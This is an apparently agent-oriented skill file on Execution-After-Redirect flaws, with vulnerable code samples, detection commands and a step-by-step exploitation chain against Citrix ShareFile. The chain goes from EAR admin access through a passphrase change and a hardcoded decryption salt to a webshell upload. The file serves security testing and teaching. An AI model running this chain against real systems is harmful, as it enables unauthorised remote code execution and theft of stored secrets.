---
name: execution-after-redirect
description: "Find Execution-After-Redirect flaws where a 302 still ships the protected body — ASP.NET Response.Redirect(url,false), Java sendRedirect() with no return, PHP header() with no exit. Use when a redirect response carries a non-empty body or an unexpectedly large Content-Length, especially on admin panels and Citrix ShareFile controllers."
---

# Execution After Redirect (EAR) Patterns

## Crown Jewel Targets

- Citrix ShareFile StorageZones Controller (pre-auth to RCE chain)
- ASP.NET admin panels using `Response.Redirect(url, false)` (endResponse=false)
- Java servlets with `sendRedirect()` missing `return` statement
- PHP apps with `header("Location: ...")` missing `exit`/`die`
- File-sharing platforms with admin configuration pages
- Enterprise CMS admin panels behind redirect-based access control

## Attack Surface Signals

- HTTP 302 responses with body content > 100 bytes
- Admin/config pages that redirect unauthenticated users to login
- .NET apps (high prevalence of `Response.Redirect(url, false)` pattern)
- File-sharing/MFT platforms (ShareFile, Egnyte, Box)
- Any page where `size_download` on a 302 response is unexpectedly large

**Source:** WatchTowr Labs (ShareFile, 2026), OWASP
**CVEs:** CVE-2026-2699, CVE-2026-2701
**Affected:** Any web application using non-terminating redirects (.NET, Java, PHP, Python, Ruby)

## Overview

Execution After Redirect (EAR) occurs when a server sends a 302/301 redirect response but continues executing the remainder of the page logic. The server writes both the redirect header AND the full page body into the response. Browsers follow the redirect and never display the body, but an attacker using a proxy or curl ignores the `Location` header and reads the response body directly. This exposes authenticated content, admin panels, and sensitive data behind "redirect-based" access controls.

## Technical Details

### Language-Specific Patterns

**.NET (`Response.Redirect`):**
```csharp
// VULNERABLE: endResponse=false prevents ThreadAbortException but page continues rendering
Response.Redirect("/login", false);
// All code below still executes, output included in response body
lblSecret.Text = GetSensitiveData();
```
The `false` parameter was introduced to avoid `ThreadAbortException` performance issues. Developers assume the redirect stops execution -- it does not.

**Java (`response.sendRedirect`):**
```java
response.sendRedirect("/login");
// VULNERABLE: missing return statement
String secret = db.getAdminConfig();
response.getWriter().write(secret);
```
`sendRedirect()` only sets headers. Without an explicit `return`, the servlet continues processing.

**PHP (`header("Location: ...")`):**
```php
header("Location: /login");
// VULNERABLE: missing exit/die
echo get_admin_panel_html();
```
PHP's `header()` function only buffers the header. Script execution continues until `exit`, `die`, or script end.

**Python (Django/Flask):**
```python
# VULNERABLE: redirect returned but function continues in middleware
return redirect('/login')
# Post-redirect middleware may still append data
```

### ShareFile Exploitation Chain (CVE-2026-2699, CVE-2026-2701)

Complete pre-auth to RCE chain exploiting EAR in Citrix ShareFile StorageZones Controller:

**Step 1: Auth Bypass via EAR on Admin Panel**
```http
GET /ConfigService/Admin.aspx HTTP/1.1
Host: sharefile.target.com
```
Server responds with 302 to login page, but the full Admin.aspx HTML is in the response body. Using Burp with "Follow redirections: Never", the attacker reads the admin interface.

**Step 2: Change Passphrase (Old Value Not Validated)**
```http
POST /ConfigService/Admin.aspx HTTP/1.1
Host: sharefile.target.com
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=...&txtNewPassphrase=attacker_passphrase&btnSave=Save
```
The passphrase change form does not require the current passphrase. Combined with EAR, this grants full admin control.

**Step 3: Redirect Storage Path to Webroot**
Reconfigure the storage zone path to point to the web application root directory, making uploaded files directly accessible via HTTP.

**Step 4: Leak TempData2 + Decrypt with Hardcoded Salt**
```
# TempData2 contains encrypted configuration
# Decryption uses hardcoded salt: p3510060xfZ2s9
# Combined with the attacker-controlled passphrase, decrypt all stored secrets
```
The hardcoded salt `p3510060xfZ2s9` is embedded in the .NET assembly and never changes across installations.

**Step 5: Upload ZIP with Webshell**
```http
POST /ConfigService/Upload.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.zip"
Content-Type: application/zip

[ZIP containing cmd.aspx with unzip=true parameter preserving filenames]
------WebKitFormBoundary--
```
The `unzip=true` parameter extracts the ZIP preserving original filenames. An ASPX webshell placed in the webroot grants full RCE.

### Hardcoded Crypto Patterns

EAR vulnerabilities frequently coexist with hardcoded cryptographic material because both reflect shortcuts in security implementation:
- Search .NET assemblies: `strings *.dll | grep -i "salt\|key\|iv\|secret\|passphrase"`
- Search Java JARs: `jar tf app.jar | xargs grep -l "AES\|DES\|HMAC\|SecretKey"`
- Common patterns: encryption salts, HMAC keys, JWT signing secrets, API master keys

## Detection Indicators

```bash
# Check if 302 responses contain body content
curl -s -D- -o response.html https://target/admin/
# If HTTP 302 AND response body > 1KB, likely EAR

# Burp approach: Set "Follow redirections: Never" in Repeater
# Send requests to authenticated endpoints without valid session
# Check response body size on 302 responses

# Automated detection
for url in $(cat admin_urls.txt); do
  size=$(curl -s -o /dev/null -w "%{size_download}" "$url")
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  if [ "$code" = "302" ] && [ "$size" -gt 100 ]; then
    echo "POTENTIAL EAR: $url (302 with $size bytes body)"
  fi
done
```

## Testing Methodology

1. **Identify all redirect-protected pages:** Map the application, note every endpoint that returns 302 when unauthenticated
2. **Check response body size:** For every 302 response, examine the body. If >100 bytes, inspect the content
3. **Burp configuration:** Set Repeater to "Follow redirections: Never" for all testing
4. **Compare authenticated vs unauthenticated:** If the 302 body matches what an authenticated user sees, EAR is confirmed
5. **Check for state-changing operations:** Can you POST to admin forms via EAR? (password changes, config updates)
6. **Look for hardcoded crypto:** If EAR exposes encrypted data, search assemblies for hardcoded keys/salts
7. **Chain analysis:** EAR admin access + file upload = RCE. EAR + password change = full account takeover
8. **Test all frameworks:** .NET, Java, PHP each have different redirect semantics

## Bug Bounty Relevance

- **CRITICAL**: EAR is one of the most overlooked vulnerability classes in modern web applications
- **CRITICAL**: Often chains directly to RCE (admin access + file upload) or full account takeover
- **HIGH**: Almost never caught by automated scanners (they follow redirects by default)
- Admin panels, configuration pages, and API management interfaces are prime targets
- File-sharing platforms, CMS systems, and enterprise admin panels are most commonly affected
- Developers widely misunderstand redirect semantics across all major frameworks
- The ShareFile chain demonstrates how a single EAR finding can escalate to pre-auth RCE
- Low duplicate risk because most researchers' tools follow redirects automatically

## Operator Notes (Battle-Tested)

- **Set Burp to "Follow redirections: Never"**: This is the single most important configuration. All EAR findings are invisible with default redirect-following behavior.
- **Automated detection loop**: `for url in admin_urls; if 302 AND body > 100 bytes, flag as EAR`. Run this on every target's authenticated endpoint list.
- **POST operations via EAR are devastating**: If you can POST to admin forms (password change, config update) through an EAR-exposed page, the impact jumps to Critical.
- **ShareFile chain is pre-auth RCE**: EAR on admin page + passphrase change (no old passphrase needed) + storage path redirect + hardcoded salt `p3510060xfZ2s9` + ZIP upload with webshell. Full chain.
- **Hardcoded crypto coexists with EAR**: Both reflect security shortcuts. When you find EAR, search assemblies for hardcoded salts, keys, IVs — they are very likely present.
- **Language-specific non-termination**: `.NET`: `Response.Redirect(url, false)`. Java: `sendRedirect()` without `return`. PHP: `header()` without `exit`. Each is equally common.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `auth-bypass-testing` | EAR is an auth bypass class |
| `deserialization-testing` → `references/dotnet-deserialization-advanced.md` | .NET admin panels exposed via EAR |
| `file-upload-testing` | Upload webshell via EAR-exposed admin |
| `backup-mft-attacks` | MFT product exploitation chains |
| `session-crlf-injection` | Session manipulation after EAR access |
